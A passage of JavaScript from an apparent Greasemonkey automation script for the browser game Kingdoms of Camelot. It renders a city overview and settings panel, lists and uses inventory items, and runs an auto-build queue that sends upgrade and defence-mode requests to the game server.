		 if (Options.includeResIcons==true) str += _row ('<img height='+Options.ResIconSize+' src=http://koc.god-like.info/img/food_30.png title="'+culang.leftfor+'"><img height='+Options.ResIconSize+' src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/7.jpg title="'+culang.leftfor+'">', row, true);
		 if (Options.includeResIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.leftfor+'</span>', row, true);
      }
    if (Options.includeInfos) {

	  	if (Options.showStatsHeadlines =="noHeadlines") str += '<TR><TD></td></tr>';
		if (Options.showStatsHeadlines =="borderHeadlines") str += '<TR><TD class=pdxStatBoarder></td></tr>';
		if (Options.showStatsHeadlines =="pdxStatLine") str += '<TR><TD class=pdxStat>'+culang.HSTinfo+'</td></tr>';
      row = [];
      for(i=0; i<Cities.numCities; i++) {
        var totWilds = 0;
        dat = Seed.wilderness['city'+ Cities.cities[i].id];
        if (dat!=null && matTypeof(dat)=='object')
          for (k in dat)
            ++totWilds;
        var castle = parseInt(Seed.buildings['city'+ Cities.cities[i].id].pos0[1]);
		
		if(castle == 11) castle = 12;
        			 else if(castle == 12) castle = 14;
        			 if (totWilds < castle)
          row[i] = '<SPAN class=boldRed><B>'+ totWilds +'/'+ castle +'</b></span>';
        else
          row[i] = totWilds +'/'+ castle;
      }
     if (Options.includeIcons==true) str += _row ('<img height=25 width=25 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/wilds.png title="'+culang.wild+'">', row, true);
     if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.wild+'</span>', row, true);
  
      row = [];
      for(i=0; i<Cities.numCities; i++) {
        totKnights = 0;
        dat = Seed.knights['city'+ Cities.cities[i].id];
        for (k in dat)
          ++totKnights;
        row[i] = totKnights;
      }
  	  if (Options.includeIcons==true) str += _row ('<img  height='+Options.IconSize+' src=https://www.facebook.com/app_full_proxy.php?app=130402594779&v=1&size=z&cksum=0fe96a471ba93095ac6305b829767ec0&src=http%3A%2F%2Fcdn1.kingdomsofcamelot.com%2Ffb%2Fe2%2Fsrc%2Fimg%2Ffeeds%2Fknight.jpg title="'+culang.knights+'">', row, true);
  	  if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.knights+'</span>', row, true);

      var now = unixTime();
      var row = [];
      for(i=0; i<Cities.numCities; i++) {
        var totTime = 0;
        var q = Seed.queue_unt['city'+Cities.cities[i].id];
        if (q!=null && q.length>0)
          totTime = q[q.length-1][3] - now;
        if (totTime < 0)
          totTime = 0;
        if (totTime < 3600)
          row[i] = '<SPAN class=boldRed><B>'+ timestr(totTime) +'</b></span>';
        else
          row[i] = timestr(totTime);
     }
     if (Options.includeIcons==true)  str += _row ('<img  height='+Options.IconSize+' src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/building_icons/build_barracks_26.png?4568 title="'+culang.que+'"><img height='+Options.IconSize+' src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1.jpg title="'+culang.que+'">', row, true);
     if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.que+'</span>', row, true);
      
      var row = [];
      for(i=0; i<Cities.numCities; i++) {
        var wall = {};
        getWallInfo (Cities.cities[i].id, wall);
        var totTime = 0;
        var q = Seed.queue_fort['city'+Cities.cities[i].id];
        if (q!=null && q.length>0)
          totTime = q[q.length-1][3] - now;
        if (totTime < 0)
          totTime = 0;
        if (totTime<1 && (wall.wallSpaceUsed < wall.wallSpace-4 || wall.fieldSpaceUsed < wall.fieldSpace-4))
          row[i] = '<SPAN class=boldRed><B>'+ timestr(totTime) +'</b></span>';
        else
          row[i] = timestr(totTime);
     }    
     if (Options.includeIcons==true) str += _row ('<img  height='+Options.IconSize+' src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/building_icons/build_walls_26.png?4568 title="'+culang.wallque+'"><img height='+Options.IconSize+' src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/1.jpg title="'+culang.wallque+'">', row, true);
     if (Options.includeIcons==false) str += _row ('<span class=pdxCapShadowRR>'+culang.wallque+'</span>', row, true);
	 }

	str += '<table class=pdxTab width="780" border="0" cellspacing="0" cellpadding="0"><tr><td colspan="8">&nbsp;</td></tr><tr>\
	<td colspan="8"><b><u>'+culang.statsview+'</u></b></td></tr><tr>		<td width="23"><INPUT type=CHECKBOX id=ptIncWachturm'+ (Options.includeWachturm?' CHECKED':'') +'></td>		<td width="133">'+culang.tower+'</td><td width="32"><INPUT type=CHECKBOX id=ptIncMaersche'+ (Options.includeMaersche?' CHECKED':'') +'></td>		<td width="274">'+culang.marches+'</td><td width="23"><INPUT type=CHECKBOX id=ptIncInfos'+ (Options.includeInfos?' CHECKED':'') +'></td>		<td width="153">'+culang.sinfo+'</td>		<td width="23"><INPUT type=CHECKBOX id=ptbevAnzeigen'+ (Options.bevAnzeigen?' CHECKED':'') +'></td>		<td width="119">'+culang.pop+'</td>		</tr> <tr><td height="20"><INPUT type=CHECKBOX id=ptIncTruppen'+ (Options.includeTruppen?' CHECKED':'') +'></td><td>'+culang.troops+'</td>		<td><INPUT type=CHECKBOX id=ptoverOriginal'+ (Options.includeCity?' CHECKED':'') +'></td>		<td>'+culang.citytroops+' </td><td><INPUT type=CHECKBOX id=ptoverIncTraining'+ (Options.includeTraining?' CHECKED':'') +'></td>		<td>'+culang.traintroops+'</td>\
	<td><INPUT type=CHECKBOX id=ptdefAnzeigen'+ (Options.defAnzeigen?' CHECKED':'') +'></td>		<td>'+culang.wall+'</td>		</tr><tr>		<td height="20"><INPUT type=CHECKBOX id=ptIncRessis'+ (Options.includeRessis?' CHECKED':'') +'></td>\
	<td>'+culang.res+'</td>		<td><INPUT type=CHECKBOX id=idCheck'+ (Options.includeMarching?' CHECKED':'') +'></td>		<td>'+culang.marchtroopsres+' </td>		<td><INPUT type=CHECKBOX id=ptBauAnzeigen'+ (Options.BauAnzeigen?' CHECKED':'') +'></td>\
	<td>'+culang.buildings+'</td>		<td><INPUT type=CHECKBOX id=ptdefBau'+ (Options.defBau?' CHECKED':'') +'></td>		<td>'+culang.wallbuild+'</td></tr><tr>		  <td height="20">&nbsp;</td>          <td height="20">'+culang.fooduse+'</td>          <td height="20" colspan="2">'+culang.top+'            <INPUT type=CHECKBOX id=ptIncNahrung'+ (Options.includeNahrung?' CHECKED':'') +'>'+culang.bottom+' <INPUT  type=CHECKBOX id=ptIncNahrungUnten '+(Options.includeNahrungUnten?' CHECKED':'') +'></td>\
	<td height="20"><INPUT type=CHECKBOX id=pdxReseachBuildTimes'+ (Options.includeReseachBuildTimes?' CHECKED':'') +'></td>          <td height="20">'+culang.buildResearchs+'</td>          <td height="20"></td>          <td height="20"></td>  </tr>\
	<tr> <td height="20" colspan="8"><u><b>'+culang.stylest+'</b></u></td>\		</tr>		</table>		<table class=pdxTab width="888" border="0" cellspacing="0" cellpadding="0">		<tr>		<td width="200">'+culang.fontsize+': '+ htmlSelector ({6:6, 7:7, 8:8, 9:9, 10:10, 11:11, 12:12, 13:13, 14:14, 15:15, 16:16}, Options.OverViewFontSize, 'id=ptoverfont') +'</td>\
	<td width="20"><INPUT  type=CHECKBOX id=pdxIncResIcons'+ (Options.includeResIcons?' CHECKED':'') +'></td>		<td >'+culang.resicons+' - '+culang.size+'		<INPUT  type=text id=togResIconSize value="'+Options.ResIconSize+'" size=7 maxlength=7></td>\
	<td >Headlines: '+ htmlSelector ({noHeadlines:'no headlines', borderHeadlines:'Line', pdxStatLine:'Standard'}, Options.showStatsHeadlines, 'id=changeStatsHStyle') +'</td>\
	</tr>		<tr>		<td>'+culang.layout+': '+ htmlSelector ({noborder:culang.ststyNoBorder, borderright:culang.ststyNoRight, borderrightleft:culang.ststyRightLeft, borderstyle:culang.ststyBorder, shadowbox:culang.ststyShdBox, inset:culang.ststyInset}, Options.showStatsStyle, 'id=changeStatsStyle') +'</td>\
	<td><INPUT type=CHECKBOX id=pdxIncIcons'+ (Options.includeIcons?' CHECKED':'') +'></td>\
	<td>'+culang.icons+' - '+culang.size+':\
	<INPUT  type=text id=togIconSize value="'+Options.IconSize+'" size=7 maxlength=7></td>\
	<td>&nbsp;</td></tr><tr><td></td>\
	<td><INPUT type=CHECKBOX id=pdxIncTrainTroopIcon'+ (Options.includeTrainTroopIcon?' CHECKED':'') +'></td>\
	<td>'+culang.trainicons+' - '+culang.size+'\
	<INPUT  type=text id=togTrTroopIconSize value="'+Options.TrTroopIconSize+'" size=7 maxlength=7></td><td>&nbsp;</td>\
	</tr></table>\
	</table></div>';
	   
	//<INPUT type=CHECKBOX id=ptOverOver'+ (Options.overviewAllowOverflow?' CHECKED':'') +'>
	// document.getElementById('ptoverOriginal').addEventListener('click', e_clickEnableTroops, false);
	
	Tabs.OverView.Overv.innerHTML = str;
	t.togStatsOpt ('ptoverOriginal', 'includeCity');	
	t.togStatsOpt ('ptIncWachturm', 'includeWachturm');	
	t.togStatsOpt ('ptIncMaersche', 'includeMaersche');	
	t.togStatsOpt ('idCheck', 'includeMarching');	
	t.togStatsOpt ('ptIncRessis', 'includeRessis');	
	t.togStatsOpt ('pdxIncTrainTroopIcon', 'includeTrainTroopIcon');
	t.togStatsOpt ('ptoverIncTraining', 'includeTraining');	
	t.togStatsOpt ('pdxIncIcons', 'includeIcons');	
	t.togStatsOpt ('pdxIncResIcons', 'includeResIcons');	
	t.togStatsOpt ('pdxReseachBuildTimes', 'includeReseachBuildTimes');	
	t.togStatsOpt ('ptIncNahrung', 'includeNahrung');	
	t.togStatsOpt ('ptdefAnzeigen', 'defAnzeigen');	
	t.togStatsOpt ('ptbevAnzeigen', 'bevAnzeigen');	
	t.togStatsOpt ('ptBauAnzeigen', 'BauAnzeigen');	
	t.togStatsOpt ('ptIncTruppen', 'includeTruppen');	
	t.togStatsOpt ('ptdefBau', 'defBau');	
	t.togStatsOpt ('ptIncNahrungUnten', 'includeNahrungUnten');	
	t.togStatsOpt ('ptIncInfos', 'includeInfos');	

	t.changeStatsOpt ('ptoverfont', 'OverViewFontSize');
	t.changeStatsOpt ('changeStatsStyle', 'showStatsStyle');	
	t.changeStatsOpt ('changeStatsHStyle', 'showStatsHeadlines');	
	t.changeStatsOpt ('togIconSize', 'IconSize');	
	t.changeStatsOpt ('togTrTroopIconSize', 'TrTroopIconSize');	
	t.changeStatsOpt ('togResIconSize', 'ResIconSize');	

     for(i=0; i<Cities.numCities; i++) {
         var button = document.getElementById('idGotoCity_'+i);
         if (button) {
            button.addEventListener('click', function() { t.clickCity(this); }, false);
        }
      }
      for(i=0; i<Cities.numCities; i++) {
             var button = document.getElementById('idToggleDef_'+i);
             if (button) {
                button.addEventListener('click', function() { t.toggleDefence(this); }, false);
            }
          }
//DebugTimer.display ('Draw Overview'); 
    } catch (e){
      Tabs.OverView.cont.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }   
    t.displayTimer = setTimeout (t.show, 5000);
	
// function e_fontSize(evt){
	  // document.getElementById('overMainDiv').style.fontSize = evt.target.value +'px';
	  // Options.OverViewFontSize = evt.target.value;
	  // t.show ();
// }
    // function e_allowWidthOverflow (evt){
      // var tf = document.getElementById('ptOverOver').checked;
      // Options.overviewAllowOverflow = tf;
      // if (tf)
        // t.cont.style.overflowX = 'visible';
      // else
        // t.cont.style.overflowX = 'auto';
    // }

  },

togStatsOpt : function (checkboxId, optionName, callOnChange, callEnable,callIsAvailable){
    var t = Tabs.OverView;
    var checkbox = document.getElementById(checkboxId);

    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (Options[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Options[optionName] = this.checked;
	  t.show ();
      saveOptions();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },
changeStatsOpt : function (valueId, optionName, callOnChange, evt){
	var t = Tabs.OverView;
	var e = document.getElementById(valueId);
	e.value = Options[optionName];
	e.addEventListener ('change', eventHandler, false);
	function eventHandler (){
	  Options[optionName] = this.value;
	  t.show ();
	  saveOptions();
	  if (callOnChange)
		callOnChange (this.value);
	  }
	  if (evt)
	   document.getElementById('overMainDiv').style.fontSize = evt.target.value +'px';
	},
	ClickWin:function(win,obj,evtName) {
		var evt = win.document.createEvent("MouseEvents");
		evt.initMouseEvent(evtName, true, true, win,
		0, 0, 0, 0, 0, false, false, false, false, 0, null);
		return !obj.dispatchEvent(evt);
	},
	Click:function(obj) {
		var t = Tabs.OverView;
		return t.ClickWin(window,obj,'click');
	},
	clickCity : function (e) {
	 var t = Tabs.OverView;
	 if ( e ) {
	   var m = e.id.split('_');
	   var cityNum = parseInt(m[1])+1;
	   var cityButton = document.getElementById('citysel_'+cityNum);
	   if (cityButton) {
		  t.Click(cityButton);
	   }
	 }
	},
  toggleDefence : function (e) {
     var t = Tabs.OverView;
     if ( e ) {
       var m = e.id.split('_');
       var cityId = Cities.cities[m[1]].id;
       var state = Seed.citystats["city" + cityId].gate;
       if ( state == 1 )
          state = 0;
       else
          state = 1; //call to change state
       t.ajaxSetDefMode (cityId, state);
     }
  }, 
  ajaxSetDefMode : function (cityId, state){ //Modified from power bot - to toggle the defensive stance.
     var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
     params.cid = cityId;
     params.state = parseInt(state);
     new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/gate.php" + unsafeWindow.g_ajaxsuffix, {
        method: "post",
        parameters: params,
        onSuccess: function (rslt) {
           if (rslt.ok) {
              Seed.citystats["city" + cityId].gate = state;
           }
        },
        onFailure: function () {
        }
     })
  },
};
function getWallInfo (cityId, objOut){
	objOut.wallSpaceUsed = 0;
	objOut.fieldSpaceUsed = 0;
	objOut.wallLevel = 0;
	objOut.wallSpace = 0;
	objOut.fieldSpace = 0;
	objOut.Crossbows = 0;
	objOut.CrossbowsTraining = 0;
	objOut.Trebuchet = 0;
	objOut.TrebuchetTraining = 0;
	objOut.Caltrops = 0;
	objOut.CaltropsTraining = 0;
	objOut.SpikedBarrier = 0;
	objOut.SpikedBarrierTraining = 0;
	objOut.Trap = 0;
	objOut.TrapTraining = 0;
	objOut.slotsBusy = 0;
	var b = Seed.buildings["city" + cityId];
	if (b.pos1==null)
		return;
	objOut.wallLevel = parseInt(b.pos1[1]);
	var spots = 0;
	for (var i=1; i<(objOut.wallLevel+1); i++)
		spots += (i * 500);
	objOut.wallSpace = spots;
	objOut.fieldSpace = spots;

	var fort = Seed.fortifications["city" + cityId];
	for (k in fort){
		var id = parseInt(k.substr(4));
		if (id == 53)
			objOut.Crossbows = parseInt(fort[k]);
		else if (id == 55)
			objOut.Trebuchet = parseInt(fort[k]);
		else if (id == 60)
			objOut.Trap = parseInt(fort[k]);
		else if (id == 61)
			objOut.Caltrops = parseInt(fort[k]);
		else if (id == 62)
			objOut.SpikedBarrier = parseInt(fort[k]);
		if (id<60)
			objOut.wallSpaceUsed += parseInt(unsafeWindow.fortstats["unt"+ id][5]) * parseInt(fort[k]);
		else
			objOut.fieldSpaceUsed += parseInt(unsafeWindow.fortstats["unt"+ id][5]) * parseInt(fort[k]);
	}
	var q = Seed.queue_fort["city"+cityId];
	if (q && q.length>0) {
		for (qi=0; qi<q.length; qi++) {
			objOut.slotsBusy++;
			if (q[qi][0]==53)
				objOut.CrossbowsTraining += parseInt(q[qi][1]);
			if (q[qi][0]==55)
				objOut.TrebuchetTraining += parseInt(q[qi][1]);
			if (q[qi][0]==60)
				objOut.TrapTraining += parseInt(q[qi][1]);
			if (q[qi][0]==61)
				objOut.CaltropsTraining += parseInt(q[qi][1]);
			if (q[qi][0]==62)
				objOut.SpikedBarrierTraining += parseInt(q[qi][1]);
		}
	}
}
/***********************************************************************************/
/************ KOC POWER - TABS INVENTAR *******************************************/
/*********************************************************************************/
Tabs.Inventar = {
	tabLabel : culang.inventar,
	tabOrder : StyleOptions.toInventar,
	cont:null,
	displayTimer : null,
	tabDisabled : StyleOptions.disInvTab,
	
	init : function (div){
	   var t = Tabs.Inventar;
	   unsafeWindow.KoCitemlist = t.useItem;
	   t.cont = div;
	   t.cont.innerHTML = '';

	   clearTimeout (t.displayTimer)
	 },
   getContent : function (){
       var t = Tabs.Inventar;
       return t.cont;
     },
     hide : function (){
       var t = Tabs.Inventar;
       t.state = null;
       clearTimeout (t.displayTimer);
     },
     
     show : function (){  
      var t = Tabs.Inventar;

      m = "<DIV class=pdxStat>"+culang.Hinventar+"</div>";
      m += "<div style='max-height:750px; height:600px; overflow-y:auto' id='idInventar'></div>";
      t.cont.innerHTML = m; 
      t.showInventar();
   },
   showInventar:function() {
    var t = Tabs.Inventar;
         var  category = ['',''+culang.general+'',''+culang.speedups+'',''+culang.combat+'',''+culang.res+'',''+culang.chest+'',''+culang.court+''];
    var m = "<TABLE class=pdxTab border=0 align=center><tr><td colspan=2><b>"+culang.article+"</td><td><b>"+culang.amount+"</td><td><b>"+culang.cat+"</td></tr>";
      var test = Seed.items;
      var e=unsafeWindow.Object.keys(Seed.items);
      var lestock = [];   
      for(var d=0;d<e.length;d++) {
       var h=e[d].split("i")[1];
       if(unsafeWindow.itemlist["i"+h] && parseInt(Seed.items[e[d]])>0){
        if ((parseInt(h)<1100 || parseInt(h)>1199) && parseInt(unsafeWindow.itemlist["i"+h].category)>0) {
         m += "<tr><td><img id='pdxItem"+h+"' onclick='pdxInventarList("+h+", this);' src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></td><td>"+unsafeWindow.itemlist["i"+h].name+"</td><td><center><b>"+Seed.items[e[d]]+"</td><td>"+ category[unsafeWindow.itemlist["i"+h].category] + "</td></tr>"; 
        }
       }
      }
    document.getElementById('idInventar').innerHTML = m;
   },
   useItem : function(num, id) {
    var t = Tabs.Inventar;
    id.src='http://koc-power-pdx.googlecode.com/svn/trunk/wait.gif';
    id.onclick="";
    unsafeWindow.cm.ItemController.use(num);
    setTimeout(function() { t.showInventar(); },1000);
   },
   
}
/***********************************************************************************/
/************ KOC POWER - TABS BUILD **********************************************/
/*********************************************************************************/
Tabs.build = {
  tabLabel: culang.build,
  tabOrder: StyleOptions.toBau,
  myDiv: null,
  timer: null,
  buildTab: null,
  koc_buildslot: null,
  currentBuildMode: null,
  buildStates: [],
  loaded_bQ: [],
  lbQ: [],

  init: function(div){
    var t = Tabs.build;
    var minQlvl = [];
    t.myDiv = div;
    t.koc_buildslot = unsafeWindow.buildslot; //save original koc function
    t.currentBuildMode = "build";
    t.buildStates = {
      running: false,
      help: false,
    };
    t.readBuildStates();

    for (var i = 0; i < Cities.cities.length; i++) {
      var cityId = Cities.cities[i].id;
      var cityID = 'city' + cityId;
      minQlvl[i] = [];
      t["bQ_" + cityId] = JSON2.parse(GM_getValue('bQ_' + getServerId() + '_' + cityId, '[]'));
      if (typeof t["bQ_" + cityId] == 'undefined' || (t["bQ_" + cityId]) == "") {
        t["bQ_" + cityId] = [];
      }
    }
    var m = '<DIV id=pbBuildDivF class=pdxStat>'+culang.HaBuild+'</div><TABLE id=pbbuildfunctions width=100% height=0% class=pdxTab><TR>';
    if (t.buildStates.running == false) {
      m += '<TD><INPUT id=pbBuildRunning type=submit value="'+culang.autobuild+' = '+culang.buttonoff+'"></td>';
    } else {
      m += '<TD><INPUT id=pbBuildRunning type=submit value="'+culang.autobuild+' = '+culang.buttonon+'"></td>';
    }
    m += '<TD><INPUT id=pbBuildMode type=submit value="'+culang.buildmode+' = '+culang.buttonoff+'"></td>';
    m += '<TD>'+culang.BThelp+' <SELECT id="pbBuildType">\
      <OPTION value=build>'+culang.onelvl+'</option>\
      <OPTION value=max>'+culang.tolvl9+'</option>\
      <OPTION value=destruct>'+culang.destruc+'</option>\
      </select></td>';
    m += '<TD><INPUT id=pbHelpRequest type=checkbox '+ (t.buildStates.help?' CHECKED':'') +'\></td><TD>'+culang.askhelp+'</td>';
    m += '</tr></table></div>';
    m += '<DIV id=pbBuildDivQ class=pdxStat>'+culang.HaBuildque+'</div>';
    m += '<TABLE id=pbbuildqueues width=100% height=0% class=pdxEntry><TR>';
    for (var i = 0; i < Cities.cities.length; i++) {
      m += '<TD colspan=2 width=100 class=pdxEntry2><CENTER><B>' + Cities.cities[i].name + '</b></center></td>';
    }
    m += '</tr><TR>';
    for (var i = 0; i < Cities.cities.length; i++) {
      m += '<TD colspan=2 class=pdxEntry2><CENTER><INPUT id=pbbuild_' + Cities.cities[i].id + ' type=submit value="'+culang.show+'"></center></td>';
    }
    m += '</tr><TR>';
	for (var i = 0; i < Cities.cities.length; i++) {
	m += '<TD colspan=2><CENTER><INPUT id=pbCancelAll_' + Cities.cities[i].id + ' type=submit value="'+culang.deleteallb+'"></center></td>';
	}
	m += '</tr><TR>';
    for (var i = 0; i < Cities.cities.length; i++) {
      m += '<TD align=right class=pdxEntry2 width=2%>'+culang.BTscws+':</td>';
      m += '<TD align=left  class=pdxEntry2 width=9% id=pbbuildcount_' + Cities.cities[i].id + '>' + t["bQ_" + Cities.cities[i].id].length + '</td>';
    }
    m += '</tr><TR>';
    for (var i = 0; i < Cities.cities.length; i++) {
      t['totalTime_' + Cities.cities[i].id] = 0;
      cbQ = t["bQ_" + Cities.cities[i].id];
      if (typeof cbQ != 'undefined') {
        for (var j = 0; j < cbQ.length; j++) {
          t['totalTime_' + Cities.cities[i].id] = parseInt(t['totalTime_' + Cities.cities[i].id]) + parseInt(cbQ[j].buildingTime);
        }
        timestring = timestr(t['totalTime_' + Cities.cities[i].id]);
      }
      m += '<TD align=right class=pdxEntry2 width=2%>'+culang.BTscbz+':</td>';
      m += '<TD align=left  class=pdxEntry2 width=9% id=pbbuildtotal_' + Cities.cities[i].id + '>' + timestring + '</td>';
    }
    m += '</tr><TR>';
    var now = unixTime();
    for (var i = 0; i < Cities.cities.length; i++) {
      var qcon = Seed.queue_con["city" + Cities.cities[i].id], btimestr = '0s';
      if (qcon.length>0) {
        btimestr = timestr(parseInt(qcon[0][4])-now);
      }
      m += '<TD align=right class=pdxEntry2 width=2%>'+culang.BTscdBZ+':</td>';
      m += '<TD align=left  class=pdxEntry2 width=9% id=pbbuildtime_' + Cities.cities[i].id + '>' + btimestr + '</td>';
    }
    m += '</tr></table><DIV class=pdxStat>'+culang.Hbterror+'</div><b>'+culang.errorrpt+'</b>: <SPAN class=boldRed id=pbbuildError></span><hr>'+culang.BTws+' | '+culang.BTbz+' | '+culang.BTdBZ+' <br><span class=boldRed>'+culang.impo+'</span>: '+culang.BTnote+'';
    t.myDiv.innerHTML = m;

    for (var i = 0; i < Cities.cities.length; i++) {
      var cityId = Cities.cities[i].id;
      var btnName = 'pbbuild_' + cityId;
      addQueueEventListener(cityId, btnName);
	  var btn2Name = 'pbCancelAll_' + cityId;
	  CancelAllEventListener(cityId, btn2Name);
      t.showBuildQueue(cityId, false);
      for (var j=0; j < t["bQ_" + cityId].length; j++) {
        var qRec = t["bQ_" + cityId][j]
        if (qRec.buildingMode == 'build') {
          //GM_log(t.getCityNameById(qRec.cityId) + ' ' + qRec.buildingPos + ' ' + qRec.buildingType + ' ' + qRec.buildingLevel + ' ' + timestr(qRec.buildingTime));
          if (minQlvl[i][qRec.buildingPos] != undefined) {
            if (minQlvl[i][qRec.buildingPos] > parseInt(qRec.buildingLevel))
              minQlvl[i][qRec.buildingPos] = parseInt(qRec.buildingLevel);
          } else
            minQlvl[i][qRec.buildingPos] = parseInt(qRec.buildingLevel);
        }
      }
      //GM_log(t.getCityNameById(cityId));
      //GM_log(inspect(minQlvl[i], 10, 1, false));
      var qcon = Seed.queue_con["city" + Cities.cities[i].id], btimestr = '0s';
      if (qcon.length>0) {
        cTgtLvl = qcon[0][1];
        cPos = qcon[0][7];
      } else {
        cTgtLvl = 100;
        cPos = 1000;
      }
      //GM_log('cPos='+cPos+'cTgtLvl='+cTgtLvl);
      for (var j in Seed.buildings[cityID]){
        var bType = parseInt(Seed.buildings[cityID][j][0]);
        var bLvl = parseInt(Seed.buildings[cityID][j][1]);
        var bPos = parseInt(Seed.buildings[cityID][j][2]);
        var bId = parseInt(Seed.buildings[cityID][j][3]);
        if (minQlvl[i][bPos] != undefined) { // we have something in the queue for this position
          var qLvl = minQlvl[i][bPos];
          //GM_log(bType+' '+bLvl+' '+bPos+' '+bId);
          //GM_log('Position='+bPos+', Current level='+bLvl+', Min queue level='+minQlvl[i][bPos]);
          if (bLvl < qLvl || (bPos == cPos && cTgtLvl < qLvl)) { // we have a gap
            var minAddLvl = bLvl; // i.e. upgrading from the current level
            var maxAddLvl = qLvl - 1; //    to just below the lowest existing level in the queue
            if (bPos == cPos && cTgtLvl < qLvl) // then we upgrade from the next level
              minAddLvl++;
            //GM_log('minAddLvl='+minAddLvl+', maxAddLvl='+maxAddLvl);
            for (var newQLvl=minAddLvl; newQLvl<=maxAddLvl; newQLvl++) {
              var buildingPos = bPos;
              var buildingType = bType;
              var buildingId = bId;
              var buildingLevel = newQLvl;
              var buildingMode = "build";
              var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
              var buildingMult = result[0];
              var buildingTime = result[1];
              var buildingAttempts = 0;
              var queueId = t["bQ_" + cityId].length;
              //GM_log(queueId+' '+cityId+' '+buildingPos+' '+buildingType+' '+buildingId+' '+buildingTime+' '+buildingLevel+' '+buildingAttempts+' '+buildingMult+' '+buildingMode);
              //t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
              //t._addTab(queueId, cityId, buildingType, buildingTime, buildingLevel, buildingAttempts, buildingMode);
            }
          }
        }
      }
    }

    t.e_autoBuild(); //start checking if we can build someting

    document.getElementById('pbBuildType').addEventListener('change', function(){t.setBuildMode(this.value);}, false);
    document.getElementById('pbBuildRunning').addEventListener('click', function(){
      t.toggleStateRunning(this);
    }, false);
    document.getElementById('pbBuildMode').addEventListener('click', function(){
      t.toggleStateMode(this);
    }, false);
    document.getElementById('pbHelpRequest').addEventListener ('change', function (){
      t.buildStates.help = (document.getElementById('pbHelpRequest').checked);
      t.saveBuildStates();
    }, false);

    window.addEventListener('unload', t.onUnload, false);

    function addQueueEventListener(cityId, name){
      document.getElementById(name).addEventListener('click', function(){
        t.showBuildQueue(cityId, true);
      }, false);
    }
	function CancelAllEventListener (cityId, name){
	document.getElementById(name).addEventListener('click', function(){
	t["bQ_" + cityId] = [];
	t['totalTime_' + cityId] = 0;
	document.getElementById('pbbuildcount_' + cityId).innerHTML = 0;
	document.getElementById('pbbuildtotal_' + cityId).innerHTML = timestr(0);
	}, false);
  }
},

  setBuildMode: function (type) {
    var t = Tabs.build;
    t.currentBuildMode = type;
  },

  e_autoBuild: function(){
    var t = Tabs.build;
    document.getElementById('pbbuildError').innerHTML = '';
    if (t.buildStates.running == true) {
      var now = unixTime();
      for (var i = 0; i < Cities.cities.length; i++) {
        var cityId = Cities.cities[i].id;
        var isBusy = false;
        var qcon = Seed.queue_con["city" + cityId], btimestr = '0s';
        if (matTypeof(qcon)=='array' && qcon.length>0) {
          var buildtimeremainsec=parseInt(qcon[0][4])-now
          if (buildtimeremainsec > 0) {
            isBusy = true;
            btimestr = timestr(buildtimeremainsec);
          } else
            qcon.shift();   // remove expired build from queue
        }
        document.getElementById('pbbuildtime_' + cityId).innerHTML = btimestr;
        if (isBusy) { //TODO add info of remaining build time and queue infos
        } else {
          if (t["bQ_" + cityId].length > 0) { // something to do?
            var bQi = t["bQ_" + cityId][0];   //take first queue item to build
            t.doOne(bQi);;
          }
        }
      }
    }
    setTimeout(t.e_autoBuild, 10000); //should be at least 10
  },

  doOne: function (bQi){
    var t = Tabs.build;
    var currentcityid = parseInt(bQi.cityId);
    var cityName = t.getCityNameById(currentcityid);
    var time = parseInt(bQi.buildingTime);
    var mult = parseInt(bQi.buildingMult);
    var attempt = parseInt(bQi.buildingAttempt);

    var mode = bQi.buildingMode;

    var citpos = parseInt(bQi.buildingPos);

    if (Seed.buildings['city' + currentcityid]["pos" + citpos] != undefined && Seed.buildings['city' + currentcityid]["pos" + citpos][0] != undefined) {
      var l_bdgid = parseInt(bQi.buildingType); //JUST FOR CHECK
      var bdgid = parseInt(Seed.buildings['city' + currentcityid]["pos" + citpos][0]);

      var l_curlvl = parseInt(bQi.buildingLevel); //JUST FOR CHECK
      var curlvl = parseInt(Seed.buildings['city' + currentcityid]["pos" + citpos][1]);

      var l_bid = parseInt(bQi.buildingId); //JUST FOR CHECK
      var bid = parseInt(Seed.buildings["city" + currentcityid]["pos" + citpos][3]);

      if (curlvl > 8 && mode == 'build') {
        t.cancelQueueElement(0, currentcityid, time, false);
        actionLog("<b>"+culang.autobuild+"</b>: "+culang.actionBuild1+"");
        return;
      };
      if (isNaN(curlvl)) {
        t.cancelQueueElement(0, currentcityid, time, false);
        actionLog("<b>"+culang.autobuild+"</b>: "+culang.actionBuild2+"");
        return;
      }
      if (l_bdgid != bdgid) {
        t.cancelQueueElement(0, currentcityid, time, false);
        actionLog("<b>"+culang.autobuild+"</b>: "+culang.actionBuild3+"");
        return;
      }
      if (l_bid != bid) {
        t.cancelQueueElement(0, currentcityid, time, false);
        actionLog("<b>"+culang.autobuild+"</b>: "+culang.actionBuild4+"");
        return;
      }
      if (l_curlvl < curlvl) {
          t.cancelQueueElement(0, currentcityid, time, false);
          actionLog("<b>"+culang.autobuild+"</b>: "+culang.actionBuild5+"");
          return;
      }
      if (l_curlvl > curlvl && mode == 'build') {
          t.requeueQueueElement(bQi);
          return;
      }

      if (mode == 'destruct') {
        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.cid = currentcityid;
        params.bid = "";
        params.pos = citpos;
        params.lv = curlvl - 1;
        if (curlvl >= 1) {
